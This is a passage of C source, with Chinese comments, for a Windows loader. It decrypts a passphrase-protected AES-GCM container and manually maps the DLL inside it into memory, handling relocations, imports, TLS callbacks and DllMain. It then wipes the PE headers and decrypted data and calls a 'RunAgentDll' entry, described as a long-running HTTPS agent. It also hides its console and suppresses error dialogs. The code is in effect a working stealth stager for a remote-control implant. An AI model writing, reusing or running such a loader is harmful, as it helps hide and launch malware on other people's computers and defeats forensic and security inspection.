        h->magic[4] == DHPLE_MAGIC4 &&
        h->magic[5] == DHPLE_MAGIC5_V2 &&
        h->magic[6] == 0 &&
        h->magic[7] == 0;
}

static int derive_aes256_key_pbkdf2_sha256(const char* passphrase, const unsigned char* salt, DWORD saltLen, ULONGLONG iterations, unsigned char outKey[32])
{
    BCRYPT_ALG_HANDLE hPrf = NULL;
    NTSTATUS st;

    if (!passphrase || !passphrase[0] || !salt || !saltLen || !iterations || !outKey) return 0;
#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    if (!resolve_dynamic_bcrypt()) return 0;
#endif
    /*
     * DHPLE2 使用 PBKDF2-HMAC-SHA256：
     * - passphrase 仍由命令行传入；
     * - salt 存在 DHPLE2 header 后面，每个容器随机生成；
     * - iterations 也写在容器里，Windows 侧按同样参数复现 key。
     */
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    #else
    st = BCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    #endif
    if (!NT_SUCCESS(st)) goto fail;
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptDeriveKeyPBKDF2(
            hPrf,
            (PUCHAR)passphrase,
            (ULONG)strlen(passphrase),
            (PUCHAR)salt,
            saltLen,
            iterations,
            outKey,
            32,
            0
        );
    #else
    st = BCryptDeriveKeyPBKDF2(
            hPrf,
            (PUCHAR)passphrase,
            (ULONG)strlen(passphrase),
            (PUCHAR)salt,
            saltLen,
            iterations,
            outKey,
            32,
            0
        );
    #endif
    if (!NT_SUCCESS(st)) goto fail;
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    g_pBCryptCloseAlgorithmProvider(hPrf, 0);
    #else
    BCryptCloseAlgorithmProvider(hPrf, 0);
    #endif
    return 1;

fail:
    if (hPrf) {
        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
        g_pBCryptCloseAlgorithmProvider(hPrf, 0);
        #else
        BCryptCloseAlgorithmProvider(hPrf, 0);
        #endif
    }
    return 0;
}

static int decrypt_cipher_aes_gcm_with_key(
    const unsigned char* nonce,
    DWORD nonceLen,
    const unsigned char* tag,
    DWORD tagLen,
    const unsigned char* cipher,
    DWORD cipherSize,
    DWORD plainSize,
    const unsigned char* aad,
    DWORD aadLen,
    const unsigned char key[32],
    unsigned char** outPlain,
    DWORD* outPlainSize)
{
    unsigned char* plain = NULL;
    unsigned char* keyObject = NULL;
    DWORD keyObjectLength = 0;
    DWORD cb = 0;
    DWORD resultSize = 0;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    NTSTATUS st;

    if (!nonce || !nonceLen || !tag || !tagLen || !cipher || !cipherSize || !plainSize || !aad || !aadLen || !key || !outPlain || !outPlainSize) return 0;
    *outPlain = NULL;
    *outPlainSize = 0;
#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    if (!resolve_dynamic_bcrypt()) return 0;
#endif

    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    #else
    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    #endif
    if (!NT_SUCCESS(st)) goto fail;
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    #else
    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    #endif
    if (!NT_SUCCESS(st)) goto fail;
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(keyObjectLength), &cb, 0);
    #else
    st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(keyObjectLength), &cb, 0);
    #endif
    if (!NT_SUCCESS(st) || !keyObjectLength) goto fail;
    keyObject = (unsigned char*)heap_alloc(keyObjectLength);
    if (!keyObject) goto fail;
    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectLength, (PUCHAR)key, 32, 0);
    #else
    st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectLength, (PUCHAR)key, 32, 0);
    #endif
    if (!NT_SUCCESS(st)) goto fail;

    plain = (unsigned char*)heap_alloc(plainSize);
    if (!plain) goto fail;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = nonceLen;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = tagLen;
    authInfo.pbAuthData = (PUCHAR)aad;
    authInfo.cbAuthData = aadLen;

    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
    st = g_pBCryptDecrypt(hKey, (PUCHAR)cipher, cipherSize, &authInfo, NULL, 0, plain, plainSize, &resultSize, 0);
    #else
    st = BCryptDecrypt(hKey, (PUCHAR)cipher, cipherSize, &authInfo, NULL, 0, plain, plainSize, &resultSize, 0);
    #endif
    if (!NT_SUCCESS(st) || resultSize != plainSize) goto fail;

    if (hKey) {
        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
        g_pBCryptDestroyKey(hKey);
        #else
        BCryptDestroyKey(hKey);
        #endif
    }
    if (keyObject) {
        SecureZeroMemory(keyObject, keyObjectLength);
        heap_free(keyObject);
    }
    if (hAlg) {
        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
        g_pBCryptCloseAlgorithmProvider(hAlg, 0);
        #else
        BCryptCloseAlgorithmProvider(hAlg, 0);
        #endif
    }
    *outPlain = plain;
    *outPlainSize = plainSize;
    return 1;

fail:
    if (plain) {
        SecureZeroMemory(plain, plainSize);
        heap_free(plain);
    }
    if (hKey) {
        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
        g_pBCryptDestroyKey(hKey);
        #else
        BCryptDestroyKey(hKey);
        #endif
    }
    if (keyObject) {
        SecureZeroMemory(keyObject, keyObjectLength);
        heap_free(keyObject);
    }
    if (hAlg) {
        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
        g_pBCryptCloseAlgorithmProvider(hAlg, 0);
        #else
        BCryptCloseAlgorithmProvider(hAlg, 0);
        #endif
    }
    return 0;
}

static int decrypt_envelope_aes_gcm(const unsigned char* fileData, DWORD fileSize, const char* passphrase, unsigned char** outPlain, DWORD* outPlainSize)
{
    unsigned char key[32];
    const unsigned char* salt = NULL;
    const unsigned char* nonce = NULL;
    const unsigned char* tag = NULL;
    const unsigned char* cipher = NULL;
    DWORD offset = 0;
    DWORD plainSize = 0;
    DWORD cipherSize = 0;
    DWORD nonceLen = 0;
    DWORD tagLen = 0;
    int ok = 0;

    if (!fileData || !outPlain || !outPlainSize) return 0;
    *outPlain = NULL;
    *outPlainSize = 0;
    SecureZeroMemory(key, sizeof(key));

    if (fileSize >= sizeof(DHPLE2_HEADER) && dhple2_magic_ok((const DHPLE2_HEADER*)fileData)) {
        const DHPLE2_HEADER* eh2 = (const DHPLE2_HEADER*)fileData;
        diag_log("DHPLE2_HEADER_FOUND");
        if (eh2->version != DHPLE2_VERSION ||
            eh2->algorithm != DHPLE_ALG_AES256_GCM_PBKDF2_SHA256_KEY ||
            eh2->kdf != DHPLE_KDF_PBKDF2_HMAC_SHA256 ||
            eh2->iterations == 0 || eh2->iterations > 10000000 ||
            eh2->salt_len == 0 || eh2->salt_len > 64 ||
            eh2->nonce_len != 12 || eh2->tag_len != 16 ||
            eh2->plain_size == 0 || eh2->cipher_size == 0) {
            diag_log("DHPLE2_HEADER_ERROR");
            return 0;
        }
        offset = (DWORD)sizeof(DHPLE2_HEADER);
        if (!range_ok(offset, eh2->salt_len, fileSize)) return 0;
        salt = fileData + offset;
        offset += eh2->salt_len;
        if (!range_ok(offset, eh2->nonce_len, fileSize)) return 0;
        nonce = fileData + offset;
        offset += eh2->nonce_len;
        if (!range_ok(offset, eh2->tag_len, fileSize)) return 0;
        tag = fileData + offset;
        offset += eh2->tag_len;
        if (!range_ok(offset, eh2->cipher_size, fileSize)) return 0;
        if (offset + eh2->cipher_size != fileSize) {
            diag_log("DHPLE2_SIZE_MISMATCH");
            return 0;
        }
        cipher = fileData + offset;
        plainSize = eh2->plain_size;
        cipherSize = eh2->cipher_size;
        nonceLen = eh2->nonce_len;
        tagLen = eh2->tag_len;

        if (!derive_aes256_key_pbkdf2_sha256(passphrase, salt, eh2->salt_len, (ULONGLONG)eh2->iterations, key)) {
            diag_log("DHPLE2_KEY_DERIVE_ERROR");
            SecureZeroMemory(key, sizeof(key));
            return 0;
        }
        diag_log("DHPLE2_KEY_DERIVE_OK");
        ok = decrypt_cipher_aes_gcm_with_key(nonce, nonceLen, tag, tagLen, cipher, cipherSize, plainSize,
                                             DHPLE_AAD_V2, (DWORD)sizeof(DHPLE_AAD_V2), key, outPlain, outPlainSize);
        SecureZeroMemory(key, sizeof(key));
        if (!ok) {
            diag_log("DHPLE2_DECRYPT_ERROR");
            return 0;
        }
        diag_log("DHPLE2_DECRYPT_OK");
        return 1;
    }

    diag_log("DHPLE_MAGIC_ERROR");
    return 0;
}

static int dhpl_magic_ok(const DHPL_HEADER* h)
{
    return h &&
        h->magic[0] == DHPL_MAGIC0 &&
        h->magic[1] == DHPL_MAGIC1 &&
        h->magic[2] == DHPL_MAGIC2 &&
        h->magic[3] == DHPL_MAGIC3 &&
        h->magic[4] == DHPL_MAGIC4 &&
        h->magic[5] == 0 &&
        h->magic[6] == 0 &&
        h->magic[7] == 0;
}

static int validate_header(const unsigned char* buf, DWORD size, const DHPL_HEADER** outHeader)
{
    const DHPL_HEADER* h;
    DWORD sections_bytes;
    DWORD relocs_bytes;
    DWORD tls_bytes;
    if (!buf || size < sizeof(DHPL_HEADER) || !outHeader) return 0;
    h = (const DHPL_HEADER*)buf;
    if (!dhpl_magic_ok(h)) {
        diag_log("DHPL_VALIDATE_MAGIC_ERROR");
        return 0;
    }
    if (h->version != DHPL_VERSION || h->arch != DHPL_ARCH_X64 || h->header_size != sizeof(DHPL_HEADER)) {
        diag_log("DHPL_VALIDATE_VERSION_OR_ARCH_ERROR");
        return 0;
    }
    if (h->total_size > size || h->total_size < sizeof(DHPL_HEADER) || h->image_size < 0x1000) {
        diag_log("DHPL_VALIDATE_SIZE_ERROR");
        return 0;
    }
    sections_bytes = h->section_count * (DWORD)sizeof(DHPL_SECTION);
    relocs_bytes = h->reloc_count * 4;
    tls_bytes = h->tls_count * 4;
    if (!range_ok(h->sections_offset, sections_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_SECTION_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->relocs_offset, relocs_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_RELOC_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->tls_offset, tls_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_TLS_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->imports_offset, 0, h->total_size) || !range_ok(h->data_offset, 0, h->total_size)) {
        diag_log("DHPL_VALIDATE_OFFSET_ERROR");
        return 0;
    }
    if (!rva_range_ok(h->entry_point_rva, 1, h->image_size) || !rva_range_ok(h->run_agent_rva, 1, h->image_size)) {
        diag_log("DHPL_VALIDATE_ENTRY_RANGE_ERROR");
        return 0;
    }
    *outHeader = h;
    return 1;
}

static int copy_sections(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    const DHPL_SECTION* secs = (const DHPL_SECTION*)(container + h->sections_offset);
    for (i = 0; i < h->section_count; i++) {
        const DHPL_SECTION* s = &secs[i];
        if (!rva_range_ok(s->virtual_address, s->virtual_size, h->image_size)) {
            diag_log_num("DHPL_SECTION_RANGE_ERROR_INDEX", i);
            return 0;
        }
        if (s->data_size) {
            if (!range_ok(s->data_offset, s->data_size, h->total_size)) {
                diag_log_num("DHPL_SECTION_DATA_RANGE_ERROR_INDEX", i);
                return 0;
            }
            if (s->data_size > s->virtual_size) {
                diag_log_num("DHPL_SECTION_DATA_TOO_LARGE_INDEX", i);
                return 0;
            }
            memcpy(image + s->virtual_address, container + s->data_offset, s->data_size);
        }
    }
    return 1;
}

static int apply_relocations(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image, ULONGLONG actual_base)
{
    DWORD i;
    LONGLONG delta = (LONGLONG)(actual_base - h->preferred_base);
    const DWORD* relocs = (const DWORD*)(container + h->relocs_offset);
    if (delta == 0) return 1;
    for (i = 0; i < h->reloc_count; i++) {
        DWORD rva = relocs[i];
        ULONGLONG* patch;
        if (!rva_range_ok(rva, sizeof(ULONGLONG), h->image_size)) {
            diag_log_num("DHPL_RELOC_RANGE_ERROR_INDEX", i);
            return 0;
        }
        patch = (ULONGLONG*)(void*)(image + rva);
        *patch = (ULONGLONG)((LONGLONG)(*patch) + delta);
    }
    return 1;
}

static int resolve_imports(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    DWORD pos = h->imports_offset;
    for (i = 0; i < h->import_count; i++) {
        const DHPL_IMPORT_FIXED* rec;
        char* moduleName;
        char* funcName;
        HMODULE mod;
        FARPROC fn;
        DWORD next;

        if (!range_ok(pos, sizeof(DHPL_IMPORT_FIXED), h->total_size)) {
            diag_log_num("DHPL_IMPORT_FIXED_RANGE_ERROR_INDEX", i);
            return 0;
        }
        rec = (const DHPL_IMPORT_FIXED*)(container + pos);
        pos += (DWORD)sizeof(DHPL_IMPORT_FIXED);
        if (!range_ok(pos, rec->module_len + rec->name_len, h->total_size)) {
            diag_log_num("DHPL_IMPORT_STRING_RANGE_ERROR_INDEX", i);
            return 0;
        }
        if (!rva_range_ok(rec->iat_rva, sizeof(ULONGLONG), h->image_size)) {
            diag_log_num("DHPL_IMPORT_IAT_RANGE_ERROR_INDEX", i);
            return 0;
        }
        moduleName = (char*)heap_alloc(rec->module_len + 1);
        funcName = (char*)heap_alloc(rec->name_len + 1);
        if (!moduleName || !funcName) {
            heap_free(moduleName);
            heap_free(funcName);
            diag_log("DHPL_IMPORT_ALLOC_ERROR");
            return 0;
        }
        memcpy(moduleName, container + pos, rec->module_len);
        moduleName[rec->module_len] = 0;
        pos += rec->module_len;
        memcpy(funcName, container + pos, rec->name_len);
        funcName[rec->name_len] = 0;
        pos += rec->name_len;
        next = align_up_dword(pos, 4);
        if (!range_ok(pos, next - pos, h->total_size)) {
            heap_free(moduleName);
            heap_free(funcName);
            diag_log_num("DHPL_IMPORT_ALIGN_RANGE_ERROR_INDEX", i);
            return 0;
        }
        pos = next;

        mod = LoadLibraryA(moduleName);
        if (!mod) {
            diag_log("DHPL_IMPORT_LOADLIBRARY_ERROR");
            diag_log(moduleName);
            heap_free(moduleName);
            heap_free(funcName);
            return 0;
        }
        fn = GetProcAddress(mod, funcName);
        if (!fn) {
            diag_log("DHPL_IMPORT_GETPROC_ERROR");
            diag_log(moduleName);
            diag_log(funcName);
            heap_free(moduleName);
            heap_free(funcName);
            return 0;
        }
        *(ULONGLONG*)(void*)(image + rec->iat_rva) = (ULONGLONG)(ULONG_PTR)fn;
        heap_free(moduleName);
        heap_free(funcName);
    }
    return 1;
}

static int register_exception_table(const DHPL_HEADER* h, unsigned char* image)
{
#if defined(_WIN64)
    DWORD count;
    if (!h->exception_rva || !h->exception_size) {
        diag_log("DHPL_EXCEPTION_NONE");
        return 1;
    }
    if (!rva_range_ok(h->exception_rva, h->exception_size, h->image_size)) {
        diag_log("DHPL_EXCEPTION_RANGE_ERROR");
        return 0;
    }
    count = h->exception_size / sizeof(RUNTIME_FUNCTION);
    if (!count) {
        diag_log("DHPL_EXCEPTION_EMPTY");
        return 1;
    }
    if (!dhpl_add_function_table((PRUNTIME_FUNCTION)(void*)(image + h->exception_rva), count, (DWORD64)(ULONG_PTR)image)) {
        diag_log("DHPL_EXCEPTION_RTL_ADD_ERROR");
        return 0;
    }
    diag_log_num("DHPL_EXCEPTION_COUNT", count);
    return 1;
#else
    (void)h;
    (void)image;
    return 1;
#endif
}

static int protect_sections(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    DWORD page;
    const DHPL_SECTION* secs = (const DHPL_SECTION*)(container + h->sections_offset);
    page = dhpl_get_page_size();
    for (i = 0; i < h->section_count; i++) {
        const DHPL_SECTION* s = &secs[i];
        DWORD oldProtect = 0;
        DWORD start = align_down_dword(s->virtual_address, page);
        DWORD end = align_up_dword(s->virtual_address + s->virtual_size, page);
        DWORD size;
        if (end <= start) continue;
        if (!rva_range_ok(start, end - start, h->image_size)) {
            diag_log_num("DHPL_PROTECT_RANGE_ERROR_INDEX", i);
            return 0;
        }
        size = end - start;
        if (!dhpl_virtual_protect(image + start, size, s->protect, &oldProtect)) {
            diag_log_num("DHPL_PROTECT_ERROR_INDEX", i);
            return 0;
        }
    }
    return 1;
}

static int call_tls_callbacks(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    const DWORD* callbacks = (const DWORD*)(container + h->tls_offset);
    for (i = 0; i < h->tls_count; i++) {
        DWORD rva = callbacks[i];
        PIMAGE_TLS_CALLBACK cb;
        if (!rva_range_ok(rva, 1, h->image_size)) {
            diag_log_num("DHPL_TLS_RANGE_ERROR_INDEX", i);
            return 0;
        }
        cb = (PIMAGE_TLS_CALLBACK)(void*)(image + rva);
        diag_log_num("DHPL_TLS_CALLBACK_INDEX", i);
        cb((LPVOID)image, DLL_PROCESS_ATTACH, NULL);
    }
    return 1;
}

static int call_dllmain(const DHPL_HEADER* h, unsigned char* image)
{
    DllMainFn entry;
    if (!h->entry_point_rva) {
        diag_log("DHPL_DLLMAIN_NONE");
        return 1;
    }
    entry = (DllMainFn)(void*)(image + h->entry_point_rva);
    if (!entry((HINSTANCE)(void*)image, DLL_PROCESS_ATTACH, NULL)) {
        diag_log("DHPL_DLLMAIN_FALSE");
        return 0;
    }
    return 1;
}

static int zero_and_protect_headers(const DHPL_HEADER* h, unsigned char* image)
{
    DWORD page;
    DWORD headerSize;
    DWORD oldProtect = 0;
    page = dhpl_get_page_size();
    headerSize = h->size_of_headers ? h->size_of_headers : page;
    headerSize = align_up_dword(headerSize, page);
    if (headerSize > h->image_size) headerSize = page;
    SecureZeroMemory(image, headerSize);
    if (!dhpl_virtual_protect(image, headerSize, PAGE_READONLY, &oldProtect)) {
        diag_log("DHPL_HEADER_PROTECT_ERROR");
        return 0;
    }
    return 1;
}

static int run_loader(const char* containerPath, const char* key)
{
    unsigned char* encryptedFile = NULL;
    DWORD encryptedFileSize = 0;
    unsigned char* container = NULL;
    DWORD containerSize = 0;
    const DHPL_HEADER* h = NULL;
    unsigned char* image = NULL;
    RunAgentDllFn runAgent;
    DWORD runAgentRva = 0;
    DWORD rc;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    FreeConsole();
    diag_log("DHPL_START");

    rc = (DWORD)read_file_winapi(containerPath, &encryptedFile, &encryptedFileSize);
    if (rc != 0) {
        diag_log_num("DHPL_READ_ERROR", rc);
        return 10;
    }
    diag_log_num("DHPL_READ_OK_SIZE", encryptedFileSize);

    if (!decrypt_envelope_aes_gcm(encryptedFile, encryptedFileSize, key, &container, &containerSize)) {
        heap_secure_free(encryptedFile, encryptedFileSize);
        return 20;
    }
    diag_log("DHPLE_DECRYPT_OK");
    heap_secure_free(encryptedFile, encryptedFileSize);
    encryptedFile = NULL;
    encryptedFileSize = 0;

    if (!validate_header(container, containerSize, &h)) {
        heap_secure_free(container, containerSize);
        return 30;
    }
    diag_log("DHPL_VALIDATE_OK");
    diag_log_hex64("DHPL_PREFERRED_BASE", h->preferred_base);
    diag_log_num("DHPL_IMAGE_SIZE", h->image_size);
    diag_log_num("DHPL_SECTION_COUNT", h->section_count);
    diag_log_num("DHPL_RELOC_COUNT", h->reloc_count);
    diag_log_num("DHPL_IMPORT_COUNT", h->import_count);
    diag_log_num("DHPL_TLS_COUNT", h->tls_count);
    diag_log_num("DHPL_RUN_AGENT_RVA", h->run_agent_rva);

    image = (unsigned char*)dhpl_virtual_alloc((LPVOID)(ULONG_PTR)h->preferred_base, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) {
        image = (unsigned char*)dhpl_virtual_alloc(NULL, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }
    if (!image) {
        diag_log("DHPL_ALLOC_ERROR");
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_ALLOC_OK");
    diag_log_hex64("DHPL_IMAGE_BASE", (ULONGLONG)(ULONG_PTR)image);

    if (!copy_sections(container, h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_SECTIONS_OK");

    if (!apply_relocations(container, h, image, (ULONGLONG)(ULONG_PTR)image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_RELOC_OK");

    if (!resolve_imports(container, h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 50;
    }
    diag_log("DHPL_IMPORT_OK");

    if (!register_exception_table(h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 50;
    }
    diag_log("DHPL_EXCEPTION_OK");

    if (!protect_sections(container, h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_PROTECT_OK");

    if (!call_tls_callbacks(container, h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 60;
    }
    diag_log("DHPL_TLS_OK");

    if (!call_dllmain(h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 60;
    }
    diag_log("DHPL_DLLMAIN_OK");

    if (!zero_and_protect_headers(h, image)) {
        dhpl_virtual_free(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_HEADER_ZERO_OK");

    /*
     * 到这里为止，runtime 已经不需要 export table。
     * RunAgentDll 的地址来自 packer 写入 DHPL1 header 的 run_agent_rva。
     */
    runAgentRva = h->run_agent_rva;
    runAgent = (RunAgentDllFn)(void*)(image + runAgentRva);
    /*
     * 映射、reloc、import、TLS、DllMain 都完成后，DHPL1 明文容器也不再需要。
     * 这里主动把堆里的解密容器清零并释放，避免 loader 长时间运行时还留着
     * “section 原始数据 + DHPL1 metadata”的临时输入缓冲。
     */
    heap_secure_free(container, containerSize);
    container = NULL;
    containerSize = 0;
    h = NULL;
    diag_log("DHPL_CONTAINER_ZERO_OK");

    diag_log("DHPL_RUN_AGENT_BEGIN");
    rc = runAgent();
    diag_log_num("DHPL_RUN_AGENT_RC", rc);

    /*
     * v1 不做 graceful unload。正常 direct_https agent 是长循环，通常不会走到这里。
     * 如果真的返回，就释放容器密文缓冲；手动映射 image 留给进程退出时回收。
     */
    return (int)rc;
}

int main(int argc, char** argv)
{
    const char* containerPath = argc > 1 ? argv[1] : resolve_default_container_path();
    const char* key = resolve_key_source(argc > 2 ? argv[2] : NULL);
    int rc;
    touch_release_markers();
#if defined(PROFILE_ONLY_DIAG)
    g_log_path = argc > 3 ? argv[3] : NULL;
#if !defined(PROFILE_ONLY_NO_LOG_ENV)
    if (!g_log_path || !g_log_path[0]) g_log_path = getenv(get_log_env_name());
#endif
#else
    (void)argc;
    (void)argv;
#endif
    if (!acquire_single_instance()) {
        return 0;
    }
    if (!key || !key[0]) {
        diag_log("DHPL_KEY_RESOLVE_ERROR");
        return 5;
    }
    rc = run_loader(containerPath, key);
    return rc;
}
